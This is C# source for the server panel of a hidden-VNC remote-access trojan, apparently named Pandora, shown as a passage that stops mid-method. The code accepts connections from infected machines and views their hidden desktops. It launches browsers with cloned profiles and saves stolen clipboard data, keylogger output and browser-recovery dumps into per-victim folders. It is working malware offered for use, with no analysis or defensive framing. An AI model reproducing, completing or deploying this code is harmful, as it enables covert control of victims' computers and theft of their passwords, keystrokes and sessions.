using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	public class FrmMain : Form
	{
        public static bool ativado_ports;
		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public static string isadmin;

		public static string detecav;

		public static Random random = new Random();

		public static string PandoraRecoveryResults;

		public static string PandoraLoggerResults;

		public static string PandoraLoggerResultsOnline;

		public static string StolenCP;

		public int count;

		public static bool ispressed = false;

		private IContainer components;

		private ImageList imageList1;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem HVNCListenBtn;

		private ToolStripMenuItem portToolStripMenuItem;

		private ToolStripTextBox HVNCListenPort;

		private ToolStripSeparator toolStripSeparator3;

		private Guna2DragControl guna2DragControl1;

		private ImageList imageList2;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader7;

		private ColumnHeader columnHeader8;

		private ColumnHeader columnHeader9;

		public ListView HVNCList;

		private ToolStripMenuItem BrowserRecovery;

		private Guna2NumericUpDown ListenPort;

		private Label StatusPort;

		private Guna2ToggleSwitch StartPort;

		private Panel panel2;

		private Label ClientsOnline;

		private Guna2ResizeBox guna2ResizeBox2;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private ToolStripMenuItem killBrowsersToolStripMenuItem1;
        internal Guna2GradientPanel Painel_Menu;
        internal Guna2HtmlLabel Guna2HtmlLabel60;
        internal Guna2PictureBox Guna2PictureBox27;
        internal Guna2PictureBox Guna2PictureBox21;
        internal Guna2GradientButton Guna2GradientButton8;
        internal Guna2HtmlLabel Guna2HtmlLabel85;
        internal Guna2GradientButton Guna2GradientButton2;
        internal Guna2GradientButton Guna2GradientButton1;
        internal Guna2GradientButton Guna2GradientButton3;
        internal Guna2GradientButton Guna2GradientButton7;
        internal Guna2GradientButton Guna2GradientButton6;
        internal Guna2PictureBox Guna2PictureBox1;
        internal Guna2GradientButton Guna2GradientButton4;
        internal Label PortText;
        internal Guna2GradientPanel Menu_Painel;
        internal Guna2Panel Guna2Panel2;
        internal Guna2CirclePictureBox Guna2CirclePictureBox2;
        internal Guna2HtmlLabel Guna2HtmlLabel71;
        internal Guna2CirclePictureBox Guna2CirclePictureBox1;
        internal Panel StatusPanel;
        internal Guna2GradientPanel Painel_connection;
        internal Guna2GradientPanel Painel_Home;
        internal Guna2PictureBox Moldura;
        internal Guna2PictureBox Guna2PictureBox40;
        internal Guna2GradientPanel Painel_Right;
        internal Guna2HtmlLabel Guna2HtmlLabel87;
        internal Guna2HtmlLabel Guna2HtmlLabel59;
        internal Guna2HtmlLabel Guna2HtmlLabel86;
        internal Guna2PictureBox Guna2PictureBox35;
        internal Guna2HtmlLabel Android11_Red;
        internal Guna2HtmlLabel Android12_Red;
        internal Guna2PictureBox Guna2PictureBox41;
        internal Guna2HtmlLabel Guna2HtmlLabel83;
        internal Guna2HtmlLabel Guna2HtmlLabel72;
        internal Guna2HtmlLabel Guna2HtmlLabel66;
        internal Guna2HtmlLabel Android12_Green;
        internal Guna2HtmlLabel Android11_Green;
        internal Guna2HtmlLabel Guna2HtmlLabel81;
        internal Guna2PictureBox Guna2PictureBox36;
        internal Guna2HtmlLabel Guna2HtmlLabel73;
        internal Guna2HtmlLabel Guna2HtmlLabel67;
        internal Guna2PictureBox Guna2PictureBox42;
        internal Guna2PictureBox Guna2PictureBox29;
        internal Guna2HtmlLabel guna2HtmlLabel13;
        internal Guna2HtmlLabel guna2HtmlLabel14;
        internal Guna2PictureBox guna2PictureBox6;
        internal Guna2HtmlLabel guna2HtmlLabel15;
        internal Guna2HtmlLabel guna2HtmlLabel16;
        internal Guna2PictureBox guna2PictureBox7;
        internal Guna2HtmlLabel guna2HtmlLabel17;
        internal Guna2HtmlLabel guna2HtmlLabel18;
        internal Guna2HtmlLabel guna2HtmlLabel19;
        internal Guna2HtmlLabel guna2HtmlLabel20;
        internal Guna2HtmlLabel guna2HtmlLabel21;
        internal Guna2HtmlLabel guna2HtmlLabel22;
        internal Guna2PictureBox guna2PictureBox8;
        internal Guna2HtmlLabel guna2HtmlLabel23;
        internal Guna2HtmlLabel guna2HtmlLabel24;
        internal Guna2PictureBox guna2PictureBox9;
        internal Guna2HtmlLabel guna2HtmlLabel25;
        internal Guna2HtmlLabel guna2HtmlLabel26;
        internal Guna2PictureBox guna2PictureBox10;
        internal Guna2HtmlLabel guna2HtmlLabel27;
        internal Guna2HtmlLabel guna2HtmlLabel28;
        internal Guna2PictureBox guna2PictureBox11;
        internal Guna2HtmlLabel guna2HtmlLabel29;
        internal Guna2HtmlLabel guna2HtmlLabel30;
        internal Guna2HtmlLabel guna2HtmlLabel31;
        internal Guna2HtmlLabel guna2HtmlLabel32;
        internal Guna2HtmlLabel guna2HtmlLabel33;
        internal Guna2HtmlLabel guna2HtmlLabel34;
        internal Guna2PictureBox guna2PictureBox12;
        internal Guna2HtmlLabel guna2HtmlLabel35;
        internal Guna2HtmlLabel guna2HtmlLabel36;
        internal Guna2PictureBox guna2PictureBox13;
        internal Guna2HtmlLabel guna2HtmlLabel1;
        internal Guna2HtmlLabel guna2HtmlLabel2;
        internal Guna2PictureBox guna2PictureBox2;
        internal Guna2HtmlLabel guna2HtmlLabel3;
        internal Guna2HtmlLabel guna2HtmlLabel4;
        internal Guna2PictureBox guna2PictureBox3;
        internal Guna2HtmlLabel guna2HtmlLabel5;
        internal Guna2HtmlLabel guna2HtmlLabel6;
        internal Guna2HtmlLabel guna2HtmlLabel7;
        internal Guna2HtmlLabel guna2HtmlLabel8;
        internal Guna2HtmlLabel guna2HtmlLabel9;
        internal Guna2HtmlLabel guna2HtmlLabel10;
        internal Guna2PictureBox guna2PictureBox4;
        internal Guna2HtmlLabel guna2HtmlLabel11;
        internal Guna2HtmlLabel guna2HtmlLabel12;
        internal Guna2PictureBox guna2PictureBox5;
        internal Guna2HtmlLabel Guna2HtmlLabel53;
        internal Guna2PictureBox Guna2PictureBox70;
        internal Guna2Button Guna2Button5;
        internal Guna2Button Guna2Button6;
        internal Guna2GradientPanel Panel_ControlPage;
        internal Guna2HtmlLabel Guna2HtmlLabel46;
        internal Guna2PictureBox Guna2PictureBox80;
        internal Guna2PictureBox Guna_Chrome;
        internal Guna2PictureBox Guna_Firefox;
        internal Guna2PictureBox guna2PictureBox17;
        internal Guna2PictureBox guna2PictureBox16;
        internal Guna2PictureBox guna2PictureBox15;
        internal Guna2PictureBox guna2PictureBox14;
        internal Guna2HtmlLabel guna2HtmlLabel41;
        internal Guna2HtmlLabel guna2HtmlLabel40;
        internal Guna2HtmlLabel guna2HtmlLabel39;
        internal Guna2HtmlLabel guna2HtmlLabel38;
        internal Guna2HtmlLabel guna2HtmlLabel37;
        internal Guna2PictureBox Guna_Opera;
        internal Guna2PictureBox Guna_Edge;
        internal Guna2PictureBox Guna_Brave;
        internal Guna2PictureBox guna2PictureBox18;
        internal Guna2HtmlLabel guna2HtmlLabel42;
        internal Guna2PictureBox guna2PictureBox20;
        internal Guna2Button 谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道;
        internal Guna2Button 式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中;
        internal Guna2PictureBox guna2PictureBox22;
        internal Guna2PictureBox guna2PictureBox19;
        internal Guna2HtmlLabel guna2HtmlLabel43;
        internal Guna2Button 要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三;
        internal Guna2HtmlLabel guna2HtmlLabel48;
        internal Guna2HtmlLabel guna2HtmlLabel47;
        internal Guna2HtmlLabel guna2HtmlLabel45;
        internal Guna2HtmlLabel guna2HtmlLabel44;
        internal Guna2PictureBox guna2PictureBox26;
        internal Guna2PictureBox guna2PictureBox25;
        internal Guna2PictureBox guna2PictureBox24;
        internal Guna2PictureBox guna2PictureBox23;
        internal Guna2PictureBox guna2PictureBox31;
        internal Guna2PictureBox guna2PictureBox30;
        internal Guna2GradientPanel Painel_Ports;
        internal Guna2GradientPanel Guna2GradientPanel13;
        internal Guna2HtmlLabel Guna2HtmlLabel118;
        internal Guna2Button Guna2Button3;
        internal Guna2TextBox Guna2TextBox7;
        internal Guna2HtmlLabel Guna2HtmlLabel109;
        internal Guna2HtmlLabel guna2HtmlLabel49;
        internal Guna2HtmlLabel Guna2HtmlLabel52;
        internal Guna2HtmlLabel Guna2HtmlLabel56;
        internal Guna2TextBox Guna2TextBox2;
        internal Guna2CheckBox Guna2CheckBox15;
        internal Guna2HtmlLabel Guna2HtmlLabel50;
        internal Guna2HtmlLabel Guna2HtmlLabel108;
        internal Guna2HtmlLabel Guna2HtmlLabel110;
        internal Guna2CheckBox Guna2CheckBox14;
        internal Guna2TextBox Guna2TextBox3;
        internal Guna2TextBox Guna2TextBox1;
        internal Guna2HtmlLabel Guna2HtmlLabel111;
        internal Guna2CheckBox Guna2CheckBox13;
        internal Guna2PictureBox Guna2PictureBox62;
        internal Guna2HtmlLabel Guna2HtmlLabel115;
        internal Guna2Button Guna2Button2;
        internal Guna2CheckBox Guna2CheckBox12;
        internal Guna2CheckBox Guna2CheckBox2;
        internal Guna2HtmlLabel Guna2HtmlLabel78;
        internal Guna2HtmlLabel Guna2HtmlLabel114;
        internal Guna2HtmlLabel Guna2HtmlLabel119;
        internal Guna2PictureBox Guna2PictureBox63;
        internal Guna2TextBox Guna2TextBox9;
        internal Guna2HtmlLabel Guna2HtmlLabel54;
        internal Guna2HtmlLabel Guna2HtmlLabel120;
        internal Guna2PictureBox Guna2PictureBox60;
        internal Guna2HtmlLabel Guna2HtmlLabel121;
        internal Guna2HtmlLabel Guna2HtmlLabel76;
        internal Guna2TextBox Guna2TextBox10;
        internal Guna2HtmlLabel Guna2HtmlLabel122;
        internal Guna2PictureBox Guna2PictureBox59;
        internal Guna2TextBox Guna2TextBox11;
        internal Guna2HtmlLabel Guna2HtmlLabel113;
        internal Guna2PictureBox Guna2PictureBox48;
        internal Guna2PictureBox Guna2PictureBox58;
        internal Guna2HtmlLabel Guna2HtmlLabel123;
        internal Guna2HtmlLabel guna2HtmlLabel51;
        internal Guna2PictureBox Guna2PictureBox57;
        internal Guna2PictureBox Guna2PictureBox66;
        internal Guna2PictureBox Guna2PictureBox56;
        internal Guna2TextBox Guna2TextBox6;
        internal Guna2PictureBox Guna2PictureBox55;
        internal Guna2HtmlLabel Guna2HtmlLabel104;
        internal Guna2PictureBox Guna2PictureBox54;
        internal Guna2TextBox Guna2TextBox4;
        internal Guna2PictureBox Guna2PictureBox53;
        internal Guna2TextBox Guna2TextBox5;
        internal Guna2PictureBox Guna2PictureBox52;
        internal Guna2HtmlLabel Guna2HtmlLabel112;
        internal Guna2PictureBox Guna2PictureBox50;
        internal Guna2CheckBox Guna2CheckBox1;
        internal Guna2CheckBox Guna2CheckBox3;
        internal Guna2CheckBox Guna2CheckBox11;
        internal Guna2CheckBox Guna2CheckBox4;
        internal Guna2CheckBox Guna2CheckBox10;
        internal Guna2CheckBox Guna2CheckBox5;
        internal Guna2CheckBox Guna2CheckBox9;
        internal Guna2CheckBox Guna2CheckBox6;
        internal Guna2CheckBox Guna2CheckBox8;
        internal Guna2CheckBox Guna2CheckBox7;
        internal Guna2GradientPanel Guna2GradientPanel12;
        internal Guna2TextBox Guna2TextBox8;
        internal Guna2HtmlLabel Guna2HtmlLabel84;
        internal Guna2HtmlLabel Guna2HtmlLabel82;
        internal Guna2HtmlLabel Guna2HtmlLabel80;
        private ToolStripMenuItem toolStripMenuItem3;
        private ToolStripMenuItem toolStripMenuItem1;
        private ToolStripMenuItem toolStripMenuItem2;
        private ToolStripMenuItem toolStripMenuItem7;
        private ToolStripMenuItem toolStripMenuItem6;
        private ToolStripMenuItem toolStripMenuItem5;
        private ToolStripMenuItem toolStripMenuItem9;
        private ToolStripMenuItem toolStripMenuItem8;
        private ToolStripMenuItem toolStripMenuItem10;
        private Guna2Transition guna2Transition2;
        private Guna2Transition Guna2Transition1;
        private Guna2ControlBox guna2ControlBox1;
        internal Guna2CirclePictureBox guna2CirclePictureBox4;
        private ToolStripMenuItem toolStripMenuItem4;

		public static string kUserDetails { get; set; }

		public static string saveurl { get; set; }

		public static string MassURL { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public FrmMain()
		{
			InitializeComponent();
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					_clientList = new List<TcpClient>();
					_TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(ListenPort.Text));
					_TcpListener.Start();
					_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (ex.Message.Contains("aborted"))
						{
							return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									enumerator = Application.OpenForms.GetEnumerator();
									while (enumerator.MoveNext())
									{
										Form form = (Form)enumerator.Current;
										if (form.Name.Contains("FrmVNC"))
										{
											form.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						bool_1 = false;
						HVNCListenBtn.Text = "Listen";
						int num = _clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							_clientList[i].Close();
						}
						_clientList = new List<TcpClient>();
						int_2 = 0;
						_TcpListener.Stop();
						ClientsOnline.Text = "Clients Online: 0";
					}
					catch (Exception)
					{
					}
				}
			}
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
			}
			catch (Exception)
			{
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}
					ulong num4 = BitConverter.ToUInt64(array, 0);
					int num5 = 0;
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num6 = 0;
						int num7 = array2.Length;
						while (num7 > 0)
						{
							num5 = tcpClient.GetStream().Read(array2, num6, num7);
							num7 -= num5;
							num6 += num5;
						}
						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
								{
									string text;
									try
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										long num8 = 0L;
										IPAddress address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
										string text2 = new Ping().Send(address).RoundtripTime.ToString();
										ListViewItem lvi2 = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											text2
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((MethodInvoker)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi2);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
									catch (Exception)
									{
										ListViewItem lvi = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											"N/A"
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((MethodInvoker)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
								}
								else if (_clientList.Contains(tcpClient))
								{
									GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception)
							{
							}
						}
						else if (_clientList.Contains(tcpClient))
						{
							GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				}
				catch (Exception ex3)
				{
					if (!ex3.Message.Contains("disposed"))
					{
						try
						{
							if (!_clientList.Contains(tcpClient))
							{
								return;
							}
							int NumberReceived;
							for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
							{
								if (Application.OpenForms[NumberReceived] == null || Application.OpenForms[NumberReceived].Tag != tcpClient)
								{
									continue;
								}
								if (Application.OpenForms[NumberReceived].Visible)
								{
									Invoke((MethodInvoker)delegate
									{
										if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									});
								}
								else if (Application.OpenForms[NumberReceived].IsHandleCreated)
								{
									Application.OpenForms[NumberReceived].Close();
								}
							}
							HVNCList.Invoke((MethodInvoker)delegate
							{
								lock (_clientList)
								{
									try
									{
										int index = _clientList.IndexOf(tcpClient);
										_clientList.RemoveAt(index);
										HVNCList.Items.RemoveAt(index);
										tcpClient.Close();
										int_2--;
										ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
									}
									catch (Exception)
									{
									}
								}
							});
						}
						catch (Exception)
						{
						}
					}
					else
					{
						tcpClient.Close();
					}
				}
			}
		}

		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			int hashCode = tcpClient_0.GetHashCode();
			FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
			if (object_2 is Bitmap)
			{
				frmVNC.VNCBoxe.Image = (Image)object_2;
			}
			else
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] dataReceive = Conversions.ToString(object_2).Split('|');
				string left = dataReceive[0];
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
				}
				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
				}
				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
				}
				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
				}
				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}
				if (Operators.CompareString(left, "208", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Vivaldi initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "209", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Vivaldi successfully started !";
				}
				if (Operators.CompareString(left, "210", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chromium initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "211", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chromium successfully started !";
				}
				if (Operators.CompareString(left, "212", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Comodo initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "213", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Comodo successfully started !";
				}
				if (Operators.CompareString(left, "214", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "MaxThon initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "215", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "MaxThon successfully started !";
				}
				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
				}
				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(dataReceive[1]);
					frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(dataReceive[1]);
				}
				if (Operators.CompareString(left, "23", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(dataReceive[1]));
				}
				if (Operators.CompareString(left, "24", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
				}
				if (Operators.CompareString(left, "25", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "26", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				Operators.CompareString(left, "719", TextCompare: false);
				if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
				if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						string text = dataReceive[1].ToString();
						if (string.IsNullOrEmpty(text))
						{
							text = "N/A";
						}
						Clipboard.SetText(text);
						StolenCP = text;
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
					thread.Join();
				}
				if (Operators.CompareString(left, "3308", TextCompare: false) == 0)
				{
					try
					{
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers"))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers");
						}
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname);
						}
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraRecovery"))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraRecovery");
						}
						PandoraRecoveryResults = dataReceive[1].ToString();
						if (!PandoraRecoveryResults.Contains("System"))
						{
							File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraRecovery\\" + xxip + "_" + xxhostname + "_PandoraRecovery.txt", PandoraRecoveryResults);
						}
						GC.Collect();
					}
					catch (Exception ex)
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraRecoveryError.txt", ex.Message);
					}
				}
				if (Operators.CompareString(left, "3310", TextCompare: false) == 0)
				{
					try
					{
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers"))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers");
						}
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname);
						}
						if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraLogger"))
						{
							Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraLogger");
						}
						PandoraLoggerResults = dataReceive[1].ToString();
						kUserDetails = xxip + "@" + xxhostname;
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + xxhostname + "\\PandoraLogger\\" + xxip + "_" + xxhostname + "_PandoraOfflineLogger.txt", PandoraLoggerResults);
						GC.Collect();
					}
					catch (Exception ex2)
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraLoggerError.txt", ex2.Message);
					}
				}
				if (Operators.CompareString(left, "3311", TextCompare: false) == 0)
				{
					try
					{
						PandoraLoggerResultsOnline = dataReceive[1].ToString();
						kUserDetails = xxip + "@" + xxhostname;
					}
					catch (Exception ex3)
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraLoggerOnlineError.txt", ex3.Message);
					}
				}
				if (Operators.CompareString(left, "1337", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = dataReceive[1];
				}
			}
		}

		public void saveonlinelogs(string results, string PKLhostname, string PKLip)
		{
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers"))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers");
			}
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname);
			}
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger"))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger");
			}
			File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger\\" + PKLip + "_" + PKLhostname + "_PandoraOnlineLogs.txt", results);
		}

		public void saveclipboard(string results, string PKLhostname, string PKLip)
		{
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers"))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers");
			}
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname);
			}
			if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger"))
			{
				Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger");
			}
			File.WriteAllText(Directory.GetCurrentDirectory() + "\\PandoraUsers\\" + PKLhostname + "\\PandoraLogger\\" + PKLip + "_" + PKLhostname + "_PandoraClipboardLogs.txt", results);
		}

		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (HVNCList.FocusedItem.Index == -1)
					{
						return;
					}
					int num = Application.OpenForms.Count - 1;
					while (true)
					{
						if (num >= 0)
						{
							if (Application.OpenForms[num].Tag == _clientList[HVNCList.FocusedItem.Index])
							{
								break;
							}
							num += -1;
							continue;
						}
						FrmVNC obj = new FrmVNC
						{
							Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode()),
							Tag = _clientList[HVNCList.FocusedItem.Index]
						};
